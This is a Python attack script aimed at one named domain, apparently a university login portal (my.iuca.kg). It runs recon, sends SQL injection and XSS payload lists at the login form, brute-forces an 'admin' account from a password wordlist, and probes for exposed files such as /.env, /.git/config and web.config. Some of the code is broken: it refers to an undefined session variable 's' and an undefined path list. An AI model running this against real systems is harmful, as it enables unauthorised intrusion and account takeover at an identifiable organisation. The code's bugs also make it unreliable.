#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hydra_iuca.py — Penetration Testing Suite for my.iuca.kg
Author: Rebel Pentester
License: Use only with explicit written permission.
"""

import requests
import ssl
import socket
import subprocess
import sys
import time
import re
import json
from pathlib import Path
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

# ============ КОНФИГ ============
TARGET = "https://my.iuca.kg"
TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
WORDLIST = Path("10k-most-common.txt")
OUTPUT_DIR = Path("iuca_pentest_results")
OUTPUT_DIR.mkdir(exist_ok=True)

session = requests.Session()
session.headers.update({"User-Agent": USER_AGENT})

# ============ УТИЛИТЫ ============
def log(msg, level="info"):
    colors = {
        "info": Fore.CYAN,
        "ok": Fore.GREEN,
        "warn": Fore.YELLOW,
        "err": Fore.RED,
        "hit": Fore.MAGENTA,
    }
    prefix = {
        "info": "[*]",
        "ok": "[+]",
        "warn": "[!]",
        "err": "[-]",
        "hit": "[★]",
    }
    print(f"{colors.get(level, Fore.WHITE)}{prefix.get(level, '[*]')} {msg}{Style.RESET_ALL}")

def save(filename, data):
    path = OUTPUT_DIR / filename
    with open(path, "w", encoding="utf-8") as f:
        if isinstance(data, (dict, list)):
            json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            f.write(str(data))
    log(f"Saved → {path}", "ok")

# ============ МОДУЛЬ 1: HTTP-ЗАГОЛОВКИ ============
def recon_headers():
    log("Recon: HTTP headers & security headers", "info")
    try:
        r = session.get(TARGET, timeout=TIMEOUT, allow_redirects=True)
        log(f"Status: {r.status_code}", "ok")
        log(f"Final URL: {r.url}", "info")

        interesting = [
            "Server", "X-Powered-By", "X-AspNet-Version",
            "X-Frame-Options", "X-Content-Type-Options",
            "Strict-Transport-Security", "Content-Security-Policy",
            "Referrer-Policy", "Permissions-Policy",
            "Set-Cookie", "X-Generator", "Via", "CF-Ray"
        ]
        headers_out = {}
        for h in interesting:
            if h in r.headers:
                headers_out[h] = r.headers[h]
                log(f"{h}: {r.headers[h]}", "ok")

        # Проверка отсутствия security headers
        missing = []
        for h in ["Strict-Transport-Security", "Content-Security-Policy",
                  "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]:
            if h not in r.headers:
                missing.append(h)
        if missing:
            log(f"MISSING security headers: {', '.join(missing)}", "warn")

        save("headers.json", headers_out)
        save("cookies.txt", r.headers.get("Set-Cookie", "No cookies"))
        return r
    except Exception as e:
        log(f"Header recon failed: {e}", "err")
        return None

# ============ МОДУЛЬ 2: SSL/TLS ============
def recon_ssl():
    log("Recon: SSL/TLS configuration", "info")
    host = urlparse(TARGET).hostname
    port = 443
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=TIMEOUT) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                proto = ssock.version()
                cipher = ssock.cipher()
                log(f"TLS version: {proto}", "ok")
                log(f"Cipher: {cipher}", "ok")
                log(f"Cert subject: {cert.get('subject')}", "info")
                log(f"Cert issuer: {cert.get('issuer')}", "info")
                log(f"Valid from: {cert.get('notBefore')}", "info")
                log(f"Valid until: {cert.get('notAfter')}", "info")
                save("ssl_info.json", {
                    "tls_version": proto,
                    "cipher": cipher,
                    "subject": str(cert.get("subject")),
                    "issuer": str(cert.get("issuer")),
                    "notBefore": cert.get("notBefore"),
                    "notAfter": cert.get("notAfter"),
                })
    except Exception as e:
        log(f"SSL recon failed: {e}", "err")

# ============ МОДУЛЬ 3: ROBOTS / SITEMAP ============
def recon_robots():
    log("Recon: robots.txt & sitemap.xml", "info")
    for path in ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"]:
        url = urljoin(TARGET, path)
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                log(f"FOUND: {url}", "hit")
                log(r.text[:500], "info")
                save(path.strip("/").replace("/", "_"), r.text)
            else:
                log(f"{url} → {r.status_code}", "info")
        except Exception as e:
            log(f"{url} error: {e}", "err")

# ============ МОДУЛЬ 4: NMAP ============
def recon_ports():
    log("Recon: Port scan (nmap top 1000)", "info")
    host = urlparse(TARGET).hostname
    try:
        result = subprocess.run(
            ["nmap", "-sV", "-T4", "--top-ports", "1000", host],
            capture_output=True, text=True, timeout=300
        )
        log("nmap done", "ok")
        save("nmap.txt", result.stdout)
        # Парсим открытые порты
        for line in result.stdout.splitlines():
            if "/tcp" in line and "open" in line:
                log(line.strip(), "hit")
    except FileNotFoundError:
        log("nmap not installed. brew install nmap", "warn")
    except Exception as e:
        log(f"nmap failed: {e}", "err")

# ============ МОДУЛЬ 5: АНАЛИЗ ФОРМЫ ЛОГИНА ============
def check_login_form():
    log("Analyzing login form...", "info")
    try:
        r = session.get(TARGET, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        log(f"Found {len(forms)} form(s)", "ok")
        forms_data = []
        for i, form in enumerate(forms):
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                inputs.append({
                    "name": inp.get("name"),
                    "type": inp.get("type", "text"),
                    "value": inp.get("value", ""),
                })
            form_info = {
                "index": i,
                "action": urljoin(TARGET, action),
                "method": method,
                "inputs": inputs,
            }
            forms_data.append(form_info)
            log(f"Form #{i}: {method.upper()} {form_info['action']}", "ok")
            for inp in inputs:
                log(f"  → {inp['type']} name={inp['name']}", "info")
        save("forms.json", forms_data)
        return forms_data
    except Exception as e:
        log(f"Form analysis failed: {e}", "err")
        return []

# ============ МОДУЛЬ 6: SQL INJECTION ============
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(3)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "\" OR \"\"=\"",
    "') OR ('1'='1",
]

def test_sqli(form):
    log(f"SQLi test on {form['action']}", "info")
    findings = []
    for payload in SQLI_PAYLOADS:
        data = {}
        for inp in form["inputs"]:
            if inp["type"] in ("text", "password", "email"):
                data[inp["name"]] = payload
            elif inp["type"] == "hidden":
                data[inp["name"]] = inp["value"]
        try:
            start = time.time()
            if form["method"] == "post":
                r = session.post(form["action"], data=data, timeout=TIMEOUT)
            else:
                r = session.get(form["action"], params=data, timeout=TIMEOUT)
            elapsed = time.time() - start
            # Эвристика: время > 3с → возможный blind SQLi
            if elapsed > 3:
                log(f"POSSIBLE TIME-BASED SQLi: payload='{payload}' took {elapsed:.2f}s", "hit")
                findings.append({"payload": payload, "elapsed": elapsed, "type": "time-based"})
            # Эвристика: SQL-ошибки
            sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                          "SQLite", "unclosed quotation", "You have an error in your SQL"]
            for err in sql_errors:
                if err.lower() in r.text.lower():
                    log(f"SQL ERROR LEAK: '{err}' with payload='{payload}'", "hit")
                    findings.append({"payload": payload, "error": err, "type": "error-based"})
                    break
        except Exception as e:
            log(f"SQLi request failed: {e}", "err")
    if not findings:
        log("No obvious SQLi detected (heuristic only)", "info")
    save("sqli_findings.json", findings)
    return findings

# ============ МОДУЛЬ 7: XSS ============
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
]

def test_xss(form):
    log(f"XSS test on {form['action']}", "info")
    findings = []
    for payload in XSS_PAYLOADS:
        data = {}
        for inp in form["inputs"]:
            if inp["type"] in ("text", "password", "email", "search"):
                data[inp["name"]] = payload
            elif inp["type"] == "hidden":
                data[inp["name"]] = inp["value"]
        try:
            if form["method"] == "post":
                r = session.post(form["action"], data=data, timeout=TIMEOUT)
            else:
                r = session.get(form["action"], params=data, timeout=TIMEOUT)
            # Проверка: payload вернулся неэкранированным
            if payload in r.text:
                log(f"POSSIBLE REFLECTED XSS with payload='{payload}'", "hit")
                findings.append({"payload": payload, "url": r.url, "type": "reflected"})
        except Exception as e:
            log(f"XSS request failed: {e}", "err")
    if not findings:
        log("No obvious reflected XSS detected", "info")
    save("xss_findings.json", findings)
    return findings

# ============ МОДУЛЬ 8: RATE LIMITING ============
def test_rate_limit(form, attempts=20):
    log(f"Rate-limit test: {attempts} rapid requests", "info")
    data = {}
    for inp in form["inputs"]:
        if inp["type"] in ("text", "password", "email"):
            data[inp["name"]] = "test_wrong_creds"
        elif inp["type"] == "hidden":
            data[inp["name"]] = inp["value"]
    statuses = []
    start = time.time()
    for i in range(attempts):
        try:
            r = session.post(form["action"], data=data, timeout=TIMEOUT)
            statuses.append(r.status_code)
            if r.status_code in (429, 403):
                log(f"Rate limit hit at attempt {i+1} (status {r.status_code})", "hit")
                break
        except Exception as e:
            log(f"Request {i+1} failed: {e}", "err")
            break
    elapsed = time.time() - start
    log(f"Done {len(statuses)} requests in {elapsed:.2f}s", "ok")
    if 429 not in statuses and 403 not in statuses:
        log("NO RATE LIMITING DETECTED — bruteforce may be feasible", "warn")
    save("rate_limit.json", {"statuses": statuses, "elapsed": elapsed, "attempts": len(statuses)})

# ============ МОДУЛЬ 9: BRUTEFORCE ============
def test_bruteforce(form, username="admin", max_tries=100):
    log(f"Bruteforce test on '{username}' (max {max_tries} tries)", "info")
    if not WORDLIST.exists():
        log(f"Wordlist not found: {WORDLIST}", "err")
        return
    passwords = [l.strip() for l in WORDLIST.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    log(f"Loaded {len(passwords)} passwords", "ok")

    user_field = None
    pass_field = None
    for inp in form["inputs"]:
        if inp["type"] in ("text", "email"):
            user_field = inp["name"]
        if inp["type"] == "password":
            pass_field = inp["name"]

    if not user_field or not pass_field:
        log("Could not identify username/password fields", "err")
        return

    hits = []
    for i, pwd in enumerate(passwords[:max_tries]):
        data = {user_field: username, pass_field: pwd}
        for inp in form["inputs"]:
            if inp["type"] == "hidden":
                data[inp["name"]] = inp["value"]
        try:
            r = session.post(form["action"], data=data, timeout=TIMEOUT, allow_redirects=False)
            # Эвристика: успех = редирект (302/301) или отсутствие "invalid" в теле
            if r.status_code in (301, 302):
                log(f"POSSIBLE HIT: {username}:{pwd} → redirect {r.status_code}", "hit")
                hits.append({"username": username, "password": pwd, "status": r.status_code})
            elif "invalid" not in r.text.lower() and "incorrect" not in r.text.lower() and "error" not in r.text.lower():
                log(f"SUSPICIOUS: {username}:{pwd} → status {r.status_code}", "hit")
                hits.append({"username": username, "password": pwd, "status": r.status_code})
        except Exception as e:
            log(f"Attempt {i+1} failed: {e}", "err")
        if (i + 1) % 10 == 0:
            log(f"Progress: {i+1}/{max_tries}", "info")
        time.sleep(0.2)  # вежливость, чтобы не заDDoSить

    save("bruteforce_hits.json", hits)
    return hits

# ============ МОДУЛЬ 10: COMMON PATHS ============
PATHS = [
    "/admin", "/admin/", "/administrator", "/login", "/wp-admin",
    "/.env", "/.git/config", "/backup.zip", "/backup.sql",
    "/phpmyadmin", "/phpinfo.php", "/info.php",
    "/api", "/api/v1", "/api/users", "/graphql",
    "/robots.txt", "/sitemap.xml", "/server-status", "/.htaccess",
    "/config.php", "/config.json", "/uploads", "/files", "/static",
    "/console", "/debug", "/actuator", "/actuator/health",
    # IIS-специфичные:
    "/web.config", "/trace.axd", "/elmah.axd", "/global.asax",
    "/aspnet_client/", "/bin/", "/App_Data/", "/App_Code/",
    "/iisstart.htm", "/iisstart.png",
    # OAuth-специфичные:
    "/signin-google", "/signin-oidc", "/.well-known/openid-configuration",
    "/Account/Login", "/Account/Register",
]

def check_web_config():
    log("Checking web.config exposure", "info")
    url = urljoin(TARGET, "/web.config")
    try:
        r = s.get(url, timeout=TIMEOUT)
        if r.status_code == 200 and "<configuration>" in r.text:
            log("CRITICAL: web.config is EXPOSED!", "hit")
            save("web_config.xml", r.text)
        else:
            log(f"web.config -> {r.status_code}", "info")
    except Exception as e:
        log(f"web.config failed: {e}", "err")

def analyze_oauth():
    log("Analyzing OAuth flow", "info")
    try:
        r = s.get(TARGET, timeout=TIMEOUT, allow_redirects=False)
        # Ищем редирект на Google OAuth
        if "accounts.google.com" in r.headers.get("Location", ""):
            log(f"OAuth redirect: {r.headers['Location']}", "hit")
            save("oauth_redirect.txt", r.headers["Location"])
        # Ищем ссылки на OAuth в HTML
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            if "accounts.google.com" in a["href"] or "oauth" in a["href"].lower():
                log(f"OAuth link: {a['href']}", "hit")
    except Exception as e:
        log(f"OAuth analysis failed: {e}", "err")

def check_common_paths():
    log("Checking common paths...", "info")
    found = []
    for path in COMMON_PATHS:
        url = urljoin(TARGET, path)
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403):
                log(f"{r.status_code} → {url}", "hit" if r.status_code == 200 else "info")
                found.append({"url": url, "status": r.status_code, "length": len(r.content)})
        except Exception:
            pass
    save("common_paths.json", found)
    return found

# ============ MAIN ============
def main():
    print(f"{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}  IUCA PENTEST SUITE — my.iuca.kg")
    print(f"{Fore.MAGENTA}  Только для легального аудита!")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}\n")

    # 1. Recon
    recon_headers()
    recon_ssl()
    recon_robots()
    # recon_ports()

    # 2. Forms
    forms = check_login_form()

    # 3. Tests on first form
    if forms:
        main_form = forms[0]
        test_sqli(main_form)
        test_xss(main_form)
        test_rate_limit(main_form, attempts=20)
        test_bruteforce(main_form, username="admin", max_tries=100)

    # 4. Common paths
    check_common_paths()

    log("PENTEST COMPLETE. Check iuca_pentest_results/", "ok")

if __name__ == "__main__":
    main()